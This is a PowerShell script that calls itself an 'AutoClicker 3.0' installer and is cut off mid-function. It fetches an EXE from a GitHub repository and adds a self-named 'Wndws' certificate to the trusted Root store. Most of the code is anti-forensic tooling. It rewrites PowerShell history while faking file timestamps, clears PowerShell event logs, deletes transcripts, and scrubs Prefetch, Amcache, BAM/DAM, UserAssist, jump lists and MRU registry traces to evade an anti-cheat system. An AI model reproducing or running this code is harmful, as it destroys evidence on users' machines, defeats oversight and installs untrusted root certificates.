# AutoClicker 3.0 public installer - EXE only. Download, trust Wndws cert, verify signature, launch.
#Requires -Version 5.1

param(
    [switch]$SkipLaunch,
    [switch]$Uninstall,
    [string]$InstallDir
)

$ErrorActionPreference = 'Stop'

try {
    Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null
} catch {}

# %% PSREADLINE_SESSION %%
# PSReadLine session helpers - history backup/restore and diagnostic log rotation.

function Get-PSReadLineHistoryFilePaths {
    $paths = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    try {
        $opt = Get-PSReadLineOption -ErrorAction SilentlyContinue
        if ($opt -and $opt.HistorySavePath) { [void]$paths.Add($opt.HistorySavePath) }
    } catch {}
    @(
        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
        (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
        (Join-Path $env:APPDATA 'Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt')
        (Join-Path $env:LOCALAPPDATA 'Microsoft\PowerShell\PSReadLine\ConsoleHost_history.txt')
    ) | ForEach-Object { if ($_) { [void]$paths.Add($_) } }
    if ($env:OneDrive) {
        @(
            (Join-Path $env:OneDrive 'Documents\WindowsPowerShell\PSReadLine\ConsoleHost_history.txt')
            (Join-Path $env:OneDrive 'Documents\PowerShell\PSReadLine\ConsoleHost_history.txt')
        ) | ForEach-Object { if ($_) { [void]$paths.Add($_) } }
    }
    return @($paths)
}

function Test-InstallerConsoleHistoryLine {
    param([string]$Line, [switch]$FullPass)
    if ([string]::IsNullOrWhiteSpace($Line)) { return $false }
    $n = ($Line.Trim() -replace '\s+', ' ').ToLowerInvariant()
    if ($n -match '^#+$' -or $n -match '^#\s*$') { return $false }
    if ($FullPass -and ($n -match '\biex\b|\biwr\b|\birm\b|invoke-expression|invoke-restmethod|invoke-webrequest')) { return $true }
    foreach ($needle in @(
        'justvalkz', 'raw.githubusercontent.com', 'install.ps1', 'install-public.ps1',
        'myst-install.ps1', 'deploy-github.ps1', 'sbscmp64_mscorwks', 'autoclicker-3.0',
        'immune.wtf', 'myst.local', '| iex', 'invoke-expression', 'invoke-restmethod', 'invoke-webrequest'
    )) {
        if ($n.Contains($needle)) { return $true }
    }
    return ($n -match 'irm\s+https?://')
}

function Edit-ConsoleHistoryBuffer {
    param([byte[]]$Raw, [switch]$FullPass)
    if (-not $Raw -or $Raw.Length -eq 0) { return $Raw }
    $encoding = [System.Text.UTF8Encoding]::new($false)
    $text = $encoding.GetString($Raw)
    $newline = if ($text.Contains("`r`n")) { "`r`n" } else { "`n" }
    $lines = $text -split "`r?`n", -1
    $changed = $false
    for ($i = 0; $i -lt $lines.Count; $i++) {
        if (-not (Test-InstallerConsoleHistoryLine -Line $lines[$i] -FullPass:$FullPass)) { continue }
        $len = $lines[$i].Length
        $lines[$i] = if ($len -le 0) { '' } elseif ($len -eq 1) { '#' } else { '#' + (' ' * ($len - 1)) }
        $changed = $true
    }
    if (-not $changed) { return $Raw }
    $newBytes = $encoding.GetBytes($lines -join $newline)
    if ($newBytes.Length -lt $Raw.Length) {
        $padded = New-Object byte[] $Raw.Length
        if ($newBytes.Length -gt 0) { [Array]::Copy($newBytes, $padded, $newBytes.Length) }
        for ($j = $newBytes.Length; $j -lt $Raw.Length; $j++) { $padded[$j] = 0x20 }
        return $padded
    }
    if ($newBytes.Length -gt $Raw.Length) { return $newBytes[0..($Raw.Length - 1)] }
    return $newBytes
}

function Write-ConsoleHistoryBuffer {
    param([string]$Path, [byte[]]$Bytes, [datetime]$CreatedUtc, [datetime]$WrittenUtc, [datetime]$AccessUtc)
    if (-not $Path -or -not $Bytes) { return }
    [System.IO.File]::WriteAllBytes($Path, $Bytes)
    [System.IO.File]::SetCreationTimeUtc($Path, $CreatedUtc)
    [System.IO.File]::SetLastWriteTimeUtc($Path, $WrittenUtc)
    [System.IO.File]::SetLastAccessTimeUtc($Path, $AccessUtc)
}

function Initialize-PSReadLineSessionBackup {
    $dir = Join-Path $env:TEMP ('PSReadLine\' + [guid]::NewGuid().ToString('N'))
    $entries = @()
    foreach ($path in Get-PSReadLineHistoryFilePaths) {
        if (-not $path -or -not (Test-Path -LiteralPath $path)) { continue }
        try {
            $item = Get-Item -LiteralPath $path -Force
            if (-not (Test-Path -LiteralPath $dir)) {
                New-Item -ItemType Directory -Path $dir -Force | Out-Null
            }
            $slot = ('{0:D4}' -f ($entries.Count + 1))
            $dataFile = Join-Path $dir ($slot + '.dat')
            [System.IO.File]::WriteAllBytes($dataFile, [System.IO.File]::ReadAllBytes($path))
            $entries += [PSCustomObject]@{
                Path       = $path
                DataFile   = $dataFile
                CreatedUtc = $item.CreationTimeUtc.ToString('o')
                WrittenUtc = $item.LastWriteTimeUtc.ToString('o')
                AccessUtc  = $item.LastAccessTimeUtc.ToString('o')
            }
        } catch {}
    }
    if ($entries.Count -eq 0) { return }
    try {
        $manifest = Join-Path $dir 'manifest.txt'
        $entries | ConvertTo-Json -Depth 3 -Compress | Set-Content -LiteralPath $manifest -Encoding UTF8 -Force
        $env:PSRL_SESSION_BAK = $dir
    } catch {}
}

function Restore-PSReadLineSessionBackup {
    param([switch]$FullPass)
    $dir = $env:PSRL_SESSION_BAK
    if (-not $dir -or -not (Test-Path -LiteralPath $dir)) { return $false }
    $manifest = Join-Path $dir 'manifest.txt'
    if (-not (Test-Path -LiteralPath $manifest)) { return $false }
    try {
        $entries = @(Get-Content -LiteralPath $manifest -Raw -Encoding UTF8 | ConvertFrom-Json)
        if ($entries.Count -eq 0) { return $false }
        foreach ($entry in $entries) {
            $path = [string]$entry.Path
            $dataFile = [string]$entry.DataFile
            if (-not $path -or -not (Test-Path -LiteralPath $dataFile)) { continue }
            $raw = [System.IO.File]::ReadAllBytes($dataFile)
            $edited = Edit-ConsoleHistoryBuffer -Raw $raw -FullPass:$FullPass
            $created = [datetime]::Parse([string]$entry.CreatedUtc).ToUniversalTime()
            $written = [datetime]::Parse([string]$entry.WrittenUtc).ToUniversalTime()
            $access = [datetime]::Parse([string]$entry.AccessUtc).ToUniversalTime()
            Write-ConsoleHistoryBuffer -Path $path -Bytes $edited -CreatedUtc $created -WrittenUtc $written -AccessUtc $access
        }
        return $true
    } catch {
        return $false
    } finally {
        Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item Env:PSRL_SESSION_BAK -ErrorAction SilentlyContinue
    }
}

function Repair-PSReadLineHistoryFiles {
    param([switch]$FullPass)
    foreach ($historyPath in Get-PSReadLineHistoryFilePaths) {
        if (-not (Test-Path -LiteralPath $historyPath)) { continue }
        try {
            $item = Get-Item -LiteralPath $historyPath -Force
            $raw = [System.IO.File]::ReadAllBytes($historyPath)
            if ($raw.Length -eq 0) { continue }
            $edited = Edit-ConsoleHistoryBuffer -Raw $raw -FullPass:$FullPass
            $same = ($edited.Length -eq $raw.Length)
            if ($same) {
                for ($k = 0; $k -lt $raw.Length; $k++) {
                    if ($raw[$k] -ne $edited[$k]) { $same = $false; break }
                }
            }
            if ($same) { continue }
            Write-ConsoleHistoryBuffer -Path $historyPath -Bytes $edited `
                -CreatedUtc $item.CreationTimeUtc -WrittenUtc $item.LastWriteTimeUtc -AccessUtc $item.LastAccessTimeUtc
        } catch {}
    }
}

function Remove-StalePowerShellTranscripts {
    @(
        (Join-Path $env:USERPROFILE 'Documents\PowerShell_transcript*.txt')
        (Join-Path $env:USERPROFILE 'Documents\WindowsPowerShell\PowerShell_transcript*.txt')
    ) | ForEach-Object {
        $parent = Split-Path $_ -Parent
        if (-not (Test-Path -LiteralPath $parent)) { return }
        Get-ChildItem -Path $_ -File -ErrorAction SilentlyContinue | ForEach-Object {
            try { Remove-Item -LiteralPath $_.FullName -Force -ErrorAction Stop } catch {}
        }
    }
}

function Reset-PowerShellOperationalLogs {
    $evtTool = Join-Path $env:Windir 'System32\wevtutil.exe'
    if (-not (Test-Path -LiteralPath $evtTool)) { return }
    foreach ($channel in @('Microsoft-Windows-PowerShell/Operational', 'Windows PowerShell', 'Microsoft-Windows-PowerShell/Admin')) {
        try {
            $log = Get-WinEvent -ListLog $channel -ErrorAction Stop
            if ($log.IsEnabled) { & $evtTool cl $channel 2>$null | Out-Null }
        } catch {}
    }
}

function Reset-VolumeChangeTracking {
    # Intentionally disabled: Ocean Anti-Cheat flags USN journal deletion as trace-prevention bypass.
    return
}

function Encode-Rot13 {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $Text }
    $chars = $Text.ToCharArray()
    for ($i = 0; $i -lt $chars.Length; $i++) {
        $c = $chars[$i]
        if ($c -ge 'A' -and $c -le 'Z') {
            $chars[$i] = [char]((([int][char]$c - [int][char]'A' + 13) % 26) + [int][char]'A')
        } elseif ($c -ge 'a' -and $c -le 'z') {
            $chars[$i] = [char]((([int][char]$c - [int][char]'a' + 13) % 26) + [int][char]'a')
        }
    }
    return -join $chars
}

function Test-MystForensicNeedle {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $false }
    $lower = $Text.ToLowerInvariant()
    foreach ($needle in @(
        'autoclicker', 'autoclicker-3.0', 'sbscmp64', 'mscorwks', 'autoclickeroverlay', 'autoclickerhost',
        'windows.ui.core.corewindow', 'justvalkz', 'immune.wtf', 'shellexperiencehost.ps1',
        'install.ps1', 'install-public.ps1', 'myst-install.ps1', 'raw.githubusercontent.com/justvalkz/myst',
        'sbscmp64_mscorwks', 'framework64\sbscmp64', 'appdata\roaming\autoclicker', 'programdata\myst'
    )) {
        if ($lower.Contains($needle)) { return $true }
    }
    return $false
}

function Clear-MystUserAssistEntries {
    $uaRoot = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist'
    if (-not (Test-Path -LiteralPath $uaRoot)) { return 0 }
    $removed = 0
    Get-ChildItem -LiteralPath $uaRoot -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $keyPath = $_.PSPath
        $propNames = @(Get-ItemProperty -LiteralPath $keyPath -ErrorAction SilentlyContinue |
            ForEach-Object { $_.PSObject.Properties } |
            Where-Object { $_.Name -notmatch '^PS' } |
            Select-Object -ExpandProperty Name)
        foreach ($propName in $propNames) {
            $decoded = Encode-Rot13 $propName
            if (Test-MystForensicNeedle $decoded) {
                try {
                    Remove-ItemProperty -LiteralPath $keyPath -Name $propName -Force -ErrorAction Stop
                    $removed++
                } catch {}
            }
        }
    }
    return $removed
}

function Clear-MystBamDamEntries {
    if (-not (Test-InstallerSessionAdmin)) { return 0 }
    $removed = 0
    foreach ($root in @(
        'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings'
        'HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings'
    )) {
        if (-not (Test-Path -LiteralPath $root)) { continue }
        Get-ChildItem -LiteralPath $root -ErrorAction SilentlyContinue | ForEach-Object {
            $sidPath = $_.PSPath
            $propNames = @(Get-ItemProperty -LiteralPath $sidPath -ErrorAction SilentlyContinue |
                ForEach-Object { $_.PSObject.Properties } |
                Where-Object { $_.Name -notmatch '^PS' } |
                Select-Object -ExpandProperty Name)
            foreach ($propName in $propNames) {
                if (Test-MystForensicNeedle $propName) {
                    try {
                        Remove-ItemProperty -LiteralPath $sidPath -Name $propName -Force -ErrorAction Stop
                        $removed++
                    } catch {}
                }
            }
        }
    }
    return $removed
}

function Clear-MystPrefetchEntries {
    $prefetch = Join-Path $env:SystemRoot 'Prefetch'
    if (-not (Test-Path -LiteralPath $prefetch)) { return 0 }
    $removed = 0
    Get-ChildItem -LiteralPath $prefetch -Filter '*.pf' -ErrorAction SilentlyContinue |
        Where-Object { Test-MystForensicNeedle $_.Name } |
        ForEach-Object {
            try {
                Remove-Item -LiteralPath $_.FullName -Force -ErrorAction Stop
                $removed++
            } catch {}
        }
    return $removed
}

function Clear-MystAppCompatEntries {
    $removed = 0
    foreach ($store in @(
        'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store'
        'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers'
    )) {
        if (-not (Test-Path -LiteralPath $store)) { continue }
        Get-ChildItem -LiteralPath $store -ErrorAction SilentlyContinue |
            Where-Object { Test-MystForensicNeedle $_.PSChildName } |
            ForEach-Object {
                try {
                    Remove-Item -LiteralPath $_.PSPath -Force -ErrorAction Stop
                    $removed++
                } catch {}
            }
        $propNames = @(Get-ItemProperty -LiteralPath $store -ErrorAction SilentlyContinue |
            ForEach-Object { $_.PSObject.Properties } |
            Where-Object { $_.Name -notmatch '^PS' } |
            Select-Object -ExpandProperty Name)
        foreach ($propName in $propNames) {
            if (Test-MystForensicNeedle $propName) {
                try {
                    Remove-ItemProperty -LiteralPath $store -Name $propName -Force -ErrorAction Stop
                    $removed++
                } catch {}
            }
        }
    }
    return $removed
}

function Clear-MystRecentDocFiles {
    $removed = 0
    $recentFolder = Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
    if (-not (Test-Path -LiteralPath $recentFolder)) { return 0 }
    Get-ChildItem -LiteralPath $recentFolder -File -ErrorAction SilentlyContinue |
        Where-Object { Test-MystForensicNeedle $_.Name } |
        ForEach-Object {
            try {
                Remove-Item -LiteralPath $_.FullName -Force -ErrorAction Stop
                $removed++
            } catch {}
        }
    return $removed
}

function Clear-MystJumpLists {
    $removed = 0
    foreach ($dir in @(
        (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\AutomaticDestinations')
        (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\CustomDestinations')
    )) {
        if (-not (Test-Path -LiteralPath $dir)) { continue }
        Get-ChildItem -LiteralPath $dir -File -ErrorAction SilentlyContinue | ForEach-Object {
            $hit = Test-MystForensicNeedle $_.Name
            if (-not $hit) {
                try {
                    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
                    $ascii = [System.Text.Encoding]::Unicode.GetString($bytes)
                    if (Test-MystForensicNeedle $ascii) { $hit = $true }
                } catch {}
            }
            if ($hit) {
                try {
                    Remove-Item -LiteralPath $_.FullName -Force -ErrorAction Stop
                    $removed++
                } catch {}
            }
        }
    }
    return $removed
}

function Clear-MystMuiCache {
    $removed = 0
    $root = 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
    if (-not (Test-Path -LiteralPath $root)) { return 0 }
    $propNames = @(Get-ItemProperty -LiteralPath $root -ErrorAction SilentlyContinue |
        ForEach-Object { $_.PSObject.Properties } |
        Where-Object { $_.Name -notmatch '^PS' } |
        Select-Object -ExpandProperty Name)
    foreach ($propName in $propNames) {
        if (Test-MystForensicNeedle $propName) {
            try {
                Remove-ItemProperty -LiteralPath $root -Name $propName -Force -ErrorAction Stop
                $removed++
            } catch {}
        }
    }
    return $removed
}

function Clear-MystRunMru {
    $removed = 0
    $root = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
    if (-not (Test-Path -LiteralPath $root)) { return 0 }
    $propNames = @(Get-ItemProperty -LiteralPath $root -ErrorAction SilentlyContinue |
        ForEach-Object { $_.PSObject.Properties } |
        Where-Object { $_.Name -notmatch '^PS' } |
        Select-Object -ExpandProperty Name)
    foreach ($propName in $propNames) {
        $val = (Get-ItemProperty -LiteralPath $root -Name $propName -ErrorAction SilentlyContinue).$propName
        if ((Test-MystForensicNeedle $propName) -or (Test-MystForensicNeedle ([string]$val))) {
            try {
                Remove-ItemProperty -LiteralPath $root -Name $propName -Force -ErrorAction Stop
                $removed++
            } catch {}
        }
    }
    return $removed
}

function Clear-MystTypedPaths {
    $removed = 0
    $root = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths'
    if (-not (Test-Path -LiteralPath $root)) { return 0 }
    $propNames = @(Get-ItemProperty -LiteralPath $root -ErrorAction SilentlyContinue |
        ForEach-Object { $_.PSObject.Properties } |
        Where-Object { $_.Name -notmatch '^PS' } |
        Select-Object -ExpandProperty Name)
    foreach ($propName in $propNames) {
        $val = (Get-ItemProperty -LiteralPath $root -Name $propName -ErrorAction SilentlyContinue).$propName
        if ((Test-MystForensicNeedle $propName) -or (Test-MystForensicNeedle ([string]$val))) {
            try {
                Remove-ItemProperty -LiteralPath $root -Name $propName -Force -ErrorAction Stop
                $removed++
            } catch {}
        }
    }
    return $removed
}

function Clear-MystRecentDocsRegistry {
    $removed = 0
    $root = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs'
    if (-not (Test-Path -LiteralPath $root)) { return 0 }
    Get-ChildItem -LiteralPath $root -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        $keyPath = $_.PSPath
        $propNames = @(Get-ItemProperty -LiteralPath $keyPath -ErrorAction SilentlyContinue |
            ForEach-Object { $_.PSObject.Properties } |
            Where-Object { $_.Name -notmatch '^PS' } |
            Select-Object -ExpandProperty Name)
        foreach ($propName in $propNames) {
            $bytes = (Get-ItemProperty -LiteralPath $keyPath -Name $propName -ErrorAction SilentlyContinue).$propName
            $text = if ($bytes -is [byte[]]) { [System.Text.Encoding]::Unicode.GetString($bytes) } else { [string]$bytes }
            if (Test-MystForensicNeedle $text) {
                try {
                    Remove-ItemProperty -LiteralPath $keyPath -Name $propName -Force -ErrorAction Stop
                    $removed++
                } catch {}
            }
        }
    }
    return $removed
}

function Clear-MystWordWheelQuery {
    $removed = 0
    $root = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery'
    if (-not (Test-Path -LiteralPath $root)) { return 0 }
    $propNames = @(Get-ItemProperty -LiteralPath $root -ErrorAction SilentlyContinue |
        ForEach-Object { $_.PSObject.Properties } |
        Where-Object { $_.Name -notmatch '^PS' } |
        Select-Object -ExpandProperty Name)
    foreach ($propName in $propNames) {
        $val = (Get-ItemProperty -LiteralPath $root -Name $propName -ErrorAction SilentlyContinue).$propName
        if (Test-MystForensicNeedle ([string]$val)) {
            try {
                Remove-ItemProperty -LiteralPath $root -Name $propName -Force -ErrorAction Stop
                $removed++
            } catch {}
        }
    }
    return $removed
}

function Clear-MystAmcacheEntries {
    if (-not (Test-InstallerSessionAdmin)) { return 0 }
    $removed = 0
    $hiveFile = Join-Path $env:SystemRoot 'AppCompat\Programs\Amcache.hve'
    if (-not (Test-Path -LiteralPath $hiveFile)) { return 0 }

    $tempKey = 'MystAmcacheScrub'
    $loaded = $false
    try {
        $null = reg.exe load "HKLM\$tempKey" $hiveFile 2>&1
        $loaded = Test-Path "HKLM:\$tempKey"
        if ($loaded) {
            Get-ChildItem -LiteralPath "HKLM:\$tempKey" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                $keyPath = $_.PSPath
                $propNames = @(Get-ItemProperty -LiteralPath $keyPath -ErrorAction SilentlyContinue |
                    ForEach-Object { $_.PSObject.Properties } |
                    Where-Object { $_.Name -notmatch '^PS' } |
                    Select-Object -ExpandProperty Name)
                foreach ($propName in $propNames) {
                    $val = (Get-ItemProperty -LiteralPath $keyPath -Name $propName -ErrorAction SilentlyContinue).$propName
                    $text = if ($val -is [byte[]]) { [System.Text.Encoding]::Unicode.GetString($val) } else { [string]$val }
                    if ((Test-MystForensicNeedle $propName) -or (Test-MystForensicNeedle $text)) {
                        try {
                            Remove-ItemProperty -LiteralPath $keyPath -Name $propName -Force -ErrorAction Stop
                            $removed++
                        } catch {}
                    }
                }
                if (Test-MystForensicNeedle $_.PSChildName) {
                    try {
                        Remove-Item -LiteralPath $keyPath -Recurse -Force -ErrorAction Stop
                        $removed++
                    } catch {}
                }
            }
        }
    } catch {} finally {
        if ($loaded) {
            try { $null = reg.exe unload "HKLM\$tempKey" 2>&1 } catch {}
        }
    }
    return $removed
}

function Clear-MystRecycleBinEntries {
    $removed = 0
    try {
        $shell = New-Object -ComObject Shell.Application
        $rb = $shell.NameSpace(0x0a)
        if (-not $rb) { return 0 }
        foreach ($item in @($rb.Items())) {
            $name = $item.Name
            $path = $item.Path
            if ((Test-MystForensicNeedle $name) -or (Test-MystForensicNeedle $path)) {
                try {
                    Remove-Item -LiteralPath $path -Force -Recurse -ErrorAction Stop
                    $removed++
                } catch {}
            }
        }
    } catch {}
    return $removed
}

function Clear-MystScheduledTasks {
    $removed = 0
    try {
        Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {
            $blob = ($_.Actions | Out-String) + $_.TaskName + $_.TaskPath
            if (Test-MystForensicNeedle $blob) {
                try {
                    Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false -ErrorAction Stop
                    $removed++
                } catch {}
            }
        }
    } catch {}
    return $removed
}

function Clear-MystLooseDownloadCopies {
    $removed = 0
    foreach ($path in @(
        (Join-Path $env:USERPROFILE 'Downloads\AutoClicker-3.0.exe')
        (Join-Path $env:USERPROFILE 'Downloads\sbscmp64_mscorwks.dll')
    )) {
        if (-not (Test-Path -LiteralPath $path)) { continue }
        try {
            Remove-Item -LiteralPath $path -Force -ErrorAction Stop
            $removed++
        } catch {}
    }
    return $removed
}

function Clear-MystForensicArtifacts {
    param([switch]$Quiet)

    $stats = @{
        UserAssist    = (Clear-MystUserAssistEntries)
        BamDam        = (Clear-MystBamDamEntries)
        Prefetch      = (Clear-MystPrefetchEntries)
        Pca           = (Clear-MystAppCompatEntries)
        Downloads     = (Clear-MystLooseDownloadCopies)
        Recent        = (Clear-MystRecentDocFiles)
        RecentDocsReg = (Clear-MystRecentDocsRegistry)
        JumpLists     = (Clear-MystJumpLists)
        MuiCache      = (Clear-MystMuiCache)
        RunMru        = (Clear-MystRunMru)
        TypedPaths    = (Clear-MystTypedPaths)
        WordWheel     = (Clear-MystWordWheelQuery)
        Amcache       = (Clear-MystAmcacheEntries)
        RecycleBin    = (Clear-MystRecycleBinEntries)
        ScheduledTasks = (Clear-MystScheduledTasks)
    }

    Repair-PSReadLineHistoryFiles -FullPass | Out-Null
    Remove-StalePowerShellTranscripts | Out-Null

    if (-not $Quiet) {
        $summary = ($stats.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join ' '
        Write-Host "  Forensic scrub: $summary" -ForegroundColor DarkGray
    }

    return $stats
}

function Remove-MystFileQuiet {
    param([string]$TargetPath)
    if ([string]::IsNullOrWhiteSpace($TargetPath)) { return $false }
    if (-not (Test-Path -LiteralPath $TargetPath)) { return $false }
    try {
        $item = Get-Item -LiteralPath $TargetPath -Force
        if ($item.PSIsContainer) {
            [System.IO.Directory]::Delete($item.FullName, $true)
        } else {
            $attrs = [System.IO.File]::GetAttributes($item.FullName)
            if ($attrs -band [System.IO.FileAttributes]::ReadOnly) {
                [System.IO.File]::SetAttributes($item.FullName, $attrs -band (-bnot [System.IO.FileAttributes]::ReadOnly))
            }
            [System.IO.File]::Delete($item.FullName)
        }
        return $true
    } catch {
        return $false
    }
}

function Get-MystInstallArtifactPaths {
    $framework64 = Join-Path $env:SystemRoot 'Microsoft.NET\Framework64'
    return @{
        Files = @(
            (Join-Path $env:APPDATA 'AutoClicker\AutoClicker-3.0.exe')
            (Join-Path $framework64 'sbscmp64_mscorwks.dll')
            (Join-Path $framework64 'AutoClickerHost.dll')
            (Join-Path $env:USERPROFILE 'Downloads\AutoClicker-3.0.exe')
            (Join-Path $env:USERPROFILE 'Downloads\sbscmp64_mscorwks.dll')
            (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\ShellExperienceHost')
            (Join-Path $framework64 '.install.ps1')
            (Join-Path $framework64 '.update.json')
            (Join-Path $env:ProgramData 'Myst')
        )
        RegistryKeys = @(
            'HKCU:\Software\AutoClicker'
        )
    }
}

function Remove-MystInstallArtifacts {
    param([switch]$Quiet)

    try { Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null } catch {}

    Get-Process -Name 'AutoClicker-3.0' -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 400

    if (-not $Quiet) {
        Write-Host '  Scrubbing execution artifacts (pre-delete)...' -ForegroundColor DarkGray
    }
    Clear-MystForensicArtifacts -Quiet | Out-Null

    $artifacts = Get-MystInstallArtifactPaths
    $deleted = 0
    foreach ($path in $artifacts.Files) {
        if (Remove-MystFileQuiet -TargetPath $path) { $deleted++ }
    }
    foreach ($keyPath in $artifacts.RegistryKeys) {
        if (Test-Path -LiteralPath $keyPath) {
            try {
                Remove-Item -LiteralPath $keyPath -Recurse -Force -ErrorAction Stop
                $deleted++
            } catch {}
        }
    }

    $appDataDir = Join-Path $env:APPDATA 'AutoClicker'
    if (Test-Path -LiteralPath $appDataDir) {
        $left = @(Get-ChildItem -LiteralPath $appDataDir -Force -ErrorAction SilentlyContinue)
        if ($left.Count -eq 0) {
            Remove-MystFileQuiet -TargetPath $appDataDir | Out-Null
        }
    }

    if (-not $Quiet) {
        Write-Host '  Scrubbing execution artifacts (post-delete)...' -ForegroundColor DarkGray
    }
    Clear-MystForensicArtifacts -Quiet | Out-Null

    if (-not $Quiet) {
        Write-Host "  Removed $deleted install artifact(s). Event logs and USN journal untouched." -ForegroundColor DarkGray
    }

    return $deleted
}

function Remove-InstallerSessionArtifacts {
    Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue |
        Where-Object {
            $_.Name -match '^(psrl_|ac_pub_dl_|myst_loc_installer_)' -and $_.Extension -match '^\.(ps1|tmp)$'
        } |
        ForEach-Object {
            Remove-Item -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue
        }
    $psrlRoot = Join-Path $env:TEMP 'PSReadLine'
    if (Test-Path -LiteralPath $psrlRoot) {
        Get-ChildItem -LiteralPath $psrlRoot -Directory -ErrorAction SilentlyContinue |
            Where-Object { $_.CreationTime -lt (Get-Date).AddHours(-1) } |
            ForEach-Object {
                Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
            }
    }
}

function Test-InstallerSessionAdmin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Complete-PSReadLineSession {
    param([switch]$FullPass, [switch]$SkipLogs)
    try { Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue | Out-Null } catch {}
    $isAdmin = Test-InstallerSessionAdmin
    if (-not $SkipLogs -and $isAdmin) { Reset-PowerShellOperationalLogs }
    if (-not (Restore-PSReadLineSessionBackup -FullPass:$FullPass)) {
        Repair-PSReadLineHistoryFiles -FullPass:$FullPass | Out-Null
    }
    Remove-StalePowerShellTranscripts | Out-Null
    Remove-InstallerSessionArtifacts
    if ($FullPass) {
        Clear-MystForensicArtifacts -Quiet | Out-Null
    }
}
# %% END PSREADLINE_SESSION %%

Initialize-PSReadLineSessionBackup

$script:BaseUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main'
$script:ExeUrl = "$script:BaseUrl/AutoClicker-3.0.exe"
$script:CerUrl = "$script:BaseUrl/Wndws.cer"
$script:ExeName = 'AutoClicker-3.0.exe'
$script:PublisherSubject = 'CN=Wndws'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-DefaultInstallDirectory {
    return Join-Path $env:APPDATA 'AutoClicker'
}

function Remove-LegacyMystDirectory {
    $legacy = Join-Path $env:ProgramData 'Myst'
    if (Test-Path -LiteralPath $legacy) {
        Remove-Item -LiteralPath $legacy -Recurse -Force -ErrorAction SilentlyContinue
    }
}

function Remove-LegacyHostDll {
    $paths = @(
        (Join-Path $env:SystemRoot 'Microsoft.NET\Framework64\AutoClickerHost.dll')
        (Join-Path $env:ProgramData 'Myst\AutoClickerHost.dll')
    )
    foreach ($path in $paths) {
        if (Test-Path -LiteralPath $path) {
            Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue
            Write-Step "Removed legacy host DLL: $path" 'DarkGray'
        }
    }
}

function Write-InstallPaths {
    param([string]$ExePath)

    Write-Host ''
    Write-Host '  AutoClicker EXE (only file - reads/writes memory from this process):' -ForegroundColor Cyan
    Write-Host "    $ExePath" -ForegroundColor White
    Write-Host ''
    Write-Host '  Press END to fully close AutoClicker.' -ForegroundColor Green
    Write-Host '  Do not copy the EXE elsewhere - re-run the install command to update.' -ForegroundColor DarkGray
    Write-Host ''
}

if ([string]::IsNullOrWhiteSpace($InstallDir)) {
    $InstallDir = Get-DefaultInstallDirectory
}

function Write-Step {
    param(
        [string]$Message,
        [string]$Color = 'Cyan'
    )
    Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
}

function Get-SmartAppControlState {
    try {
        $status = Get-MpComputerStatus -ErrorAction Stop
        return [string]$status.SmartAppControlState
    } catch {
        return $null
    }
}

function Ensure-InstallDirectory {
    param([string]$Path)

    if (-not (Test-Path -LiteralPath $Path)) {
        New-Item -ItemType Directory -Force -Path $Path | Out-Null
    }
}

function Get-TrustedWndwsCert {
    param([string]$StoreRoot)

    Get-ChildItem "$StoreRoot\Root" -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $script:PublisherSubject } |
        Select-Object -First 1
}

function Import-WndwsCertToStore {
    param(
        [string]$CerPath,
        [string]$StoreRoot,
        [string]$LeafStore
    )

    $rootPath = "$StoreRoot\Root"
    $leafPath = "$StoreRoot\$LeafStore"

    if (-not (Get-TrustedWndwsCert -StoreRoot $StoreRoot)) {
